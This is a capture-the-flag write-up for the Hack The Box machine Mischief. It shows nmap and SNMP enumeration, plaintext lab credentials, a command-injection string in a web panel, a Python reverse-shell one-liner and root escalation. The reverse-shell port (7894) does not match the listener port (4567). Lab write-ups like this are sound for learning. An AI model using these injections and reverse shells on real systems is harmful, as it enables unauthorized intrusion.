# Mischief writeups by Seyptoo.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/5/1545987123-capture-du-2018-12-28-09-51-50.png)](https://hackthebox.eu/)

Informations
----
    Ip : 10.10.10.92       Created by : trickster0
    Level : Hard            Base Points : 50
    
Nmap Scan
----
**PORT : [22] [3366]. There are some interesting things in its open ports ! :D**

    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief# nmap -sT -sV -p 1-65535 10.10.10.92 -oA nmap/mischief --min-rate 1000 --max-retries 5

    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-28 10:02 CET
    Nmap scan report for 10.10.10.92
    Host is up (0.053s latency).
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    3366/tcp open  http    BaseHTTPServer
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds

HTTP PORT 3366
----

As we can see we have .htaccess, I try passwords by default, I also try the bruteforce attack nothing works, so I intend to do a UDP scan to enumerate a little more ports open.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/5/1545988875-capture-du-2018-12-28-10-21-06.png)](http://10.10.10.92:3366/)

UDP SCAN
----
    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief# nmap -sU -sV 10.10.10.92 -oA nmap/scan_udp

    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-28 10:24 CET
    Nmap scan report for 10.10.10.92
    Host is up (0.055s latency).
    PORT    STATE SERVICE VERSION
    161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
    Service Info: Host: Mischief

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
    
Perfect, we find something interesting to list a little more. The SNMP protocol is a network management protocol, I will not go into detail in its operation.

Enumeration SNMP
----
We are going to metasploit, and enumerate the SNMP protocol and find interesting things! :D

    msf auxiliary(scanner/snmp/snmp_enum) > show options
    
    Module options (auxiliary/scanner/snmp/snmp_enum):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       COMMUNITY  public           yes       SNMP Community String
       RETRIES    1                yes       SNMP Retries
       RHOSTS                      yes       The target address range or CIDR identifier
       RPORT      161              yes       The target port (UDP)
       THREADS    1                yes       The number of concurrent threads
       TIMEOUT    1                yes       SNMP Timeout
       VERSION    1                yes       SNMP Version <1/2c>

    msf auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.10.92
    
We launch the exploit and see what we find ! :D


    417                 unknown             rdma_cm                                                     
    519                 runnable            systemd-network     /lib/systemd/systemd-networkd                    
    544                 runnable            systemd-timesyn     /lib/systemd/systemd-timesyncd                    
    547                 runnable            systemd-resolve     /lib/systemd/systemd-resolved                    
    551                 runnable            rsyslogd            /usr/sbin/rsyslogd  -n                  
    553                 runnable            VGAuthService       /usr/bin/VGAuthService                    
    558                 runnable            networkd-dispat     /usr/bin/python3    /usr/bin/networkd-dispatcher
    561                 runnable            lxcfs               /usr/bin/lxcfs      /var/lib/lxcfs/     
    568                 runnable            cron                /usr/sbin/cron      -f                  
    570                 runnable            atd                 /usr/sbin/atd       -f                  
    572                 runnable            systemd-logind      /lib/systemd/systemd-logind                    
    576                 runnable            accounts-daemon     /usr/lib/accountsservice/accounts-daemon                    
    577                 runnable            dbus-daemon         /usr/bin/dbus-daemon--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    578                 runnable            cron                /usr/sbin/CRON      -f                  
    583                 runnable            sh                  /bin/sh             -c /home/loki/hosted/webstart.sh
    588                 running             snmpd               /usr/sbin/snmpd     -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
    594                 runnable            sh                  /bin/sh             /home/loki/hosted/webstart.sh
    596                 runnable            python              python              -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
    628                 runnable            iscsid              /sbin/iscsid                            
    629                 runnable            iscsid              /sbin/iscsid                            
    644                 runnable            sshd                /usr/sbin/sshd      -D                  
    645                 runnable            polkitd             /usr/lib/policykit-1/polkitd--no-debug          
    675                 runnable            agetty              /sbin/agetty        -o -p -- \u --noclear tty1 linux
    735                 runnable            mysqld              /usr/sbin/mysqld    --daemonize --pid-file=/run/mysqld/mysqld.pid
    751                 runnable            apache2             /usr/sbin/apache2   -k start            
    776                 runnable            apache2             /usr/sbin/apache2   -k start            
    777                 runnable            apache2             /usr/sbin/apache2   -k start            
    778                 runnable            apache2             /usr/sbin/apache2   -k start            
    779                 runnable            apache2             /usr/sbin/apache2   -k start            
    780                 runnable            apache2             /usr/sbin/apache2   -k start            
    1236                runnable            apache2             /usr/sbin/apache2   -k start
  
> Username : **loki**<br />
> Password : **godofmischiefisloki**

Perfect, we found some very interesting data about a user and a password. we will connect to the panel! :D and check the page ! :D

HTTP Server
----
In the page there is not much, apart from a historical image, I try to see if there was steganography, but unfortunately I did not find anything in the image, I also to make a gobuster attack but I also find nothing and SSH.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/5/1545990823-capture-du-2018-12-28-10-53-20.png)](http://10.10.10.92:3366/)

As we have not found anything, we will do a scan SNMPv6 there is a tool specially made for that by the creator of this box

SNMP|IPV6
----
Let's install the Enyx program, and use the program to enumerate things

    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief# git clone https://github.com/trickster0/Enyx
    Clonage dans 'Enyx'...
    remote: Enumerating objects: 70, done.
    remote: Total 70 (delta 0), reused 0 (delta 0), pack-reused 70
    Dépaquetage des objets: 100% (70/70), fait.
    Vérification de la connectivité... fait.
    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief#

After installing the program with the necessary commands. :D

    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief/Enyx# python enyx.py 1 public 10.10.10.92
    ###################################################################################
    #                                                                                 #
    #                      #######     ##      #  #    #  #    #                      #
    #                      #          #  #    #    #  #    #  #                       #
    #                      ######    #   #   #      ##      ##                        #
    #                      #        #    # #        ##     #  #                       #
    #                      ######  #     ##         ##    #    #                      #
    #                                                                                 #
    #                           SNMP IPv6 Enumerator Tool                             #
    #                                                                                 #
    #                   Author: Thanasis Tserpelis aka Trickster0                     #
    #                                                                                 #
    ###################################################################################


    [+] Snmpwalk found.
    [+] Grabbing IPv6.
    [+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
    [+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:8e66
    [+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:8e66

We found IPv6 addresses, so let's analyze that! : D the only IPV6 addresses that work this is the **Unique-Local**

    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief/Enyx# nmap -6 -sV dead:beef:0000:0000:0250:56ff:feb9:8e66

    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-28 11:10 CET
    Nmap scan report for dead:beef::250:56ff:feb9:8e66
    Host is up (0.067s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
Yes ! We find ports, we access the WEB server and see what we find. :D

IPV6 HTTP
----
[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/5/1545992242-capture-du-2018-12-28-11-17-08.png)](https://hackthebox.eu)

I tried several attempts and I found the users and password.

> Username : **Administrator** <br />
> Password : **trickeryanddeceit** (This is the password in the main web page.)

Perfect we have access now to bypass that, after several attempts I found to read files and execute specific commands.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/52/5/1545992557-capture-du-2018-12-28-11-22-28.png)](https://hackthebox.eu)

I typed that and I found the password for good, so we can connect in SSH and have a shell! :D

> cat /home/loki/* && ping -c 2 127.0.0.1 <br />

> Password : lokiisthebestnorsegod <br />

    root@seyptoo-Aspire-E5-721:~/htb/writeup/Mischief/Enyx# ssh loki@10.10.10.92 -t bash
    loki@10.10.10.92's password: 
    loki@Mischief:~$ 
  
BIM i have shell ! :D

    loki@Mischief:~$ wc -c user.txt 
    33 user.txt
    loki@Mischief:~$ awk -F: '{print $1,$7}' /etc/passwd|grep '/bin/bash'
    root /bin/bash
    loki /bin/bash
    loki@Mischief:~$
    
PrivEsc
----

The root is not very complicated just a little creativity and logic, so there is the root password in the .bash_history file, but we can not do a **su** the command is unreachable for the user. user loki but for the user www-data we have access, for that we have to do an IPV6 reverse shell from the panel.

    loki@Mischief:~$ head -1 .bash_history 
    python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
    loki@Mischief:~$
    
> Username : root <br />
> Password : lokipasswordmischieftrickery

    loki@Mischief:~$ nc -6 -lvp 4567
    Listening on [::] (family 10, port 4567)

We have a listener, now have to do a reverse shell from the panel with address ipv6 obviously.

We do not have to put the IPV6 address of the machine, but the loopback address type this command and do the reverse shell, I took a lot of time to do the reverse shell.

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("::1",7894));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' && ping -c 2 127.0.0.1
    
AND BIM REVERSE SHELL ! :D

    loki@Mischief:~$ nc -6 -lvp 4567
    Listening on [::] (family 10, port 4567)
    Connection from localhost6.localdomain6 46886 received!
    /bin/sh: 0: can't access tty; job control turned off
    $ python -c "import pty;pty.spawn('/bin/bash')"
    www-data@Mischief:/var/www/html$ su - root
    su - root
    Password: lokipasswordmischieftrickery
    root@Mischief:~# cat /root/root.txt
    The flag is not here, get a shell to find it!
    root@Mischief:~# find / -type f -name "root.txt" -exec cat {} \; -print 2>/dev/null
    *****fad479c56f912c65d7be4487807
    /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
    The flag is not here, get a shell to find it!
    /root/root.txt
    
Do not hesitate to put a star in my repository and follow me it will make me serious pleasure! :D
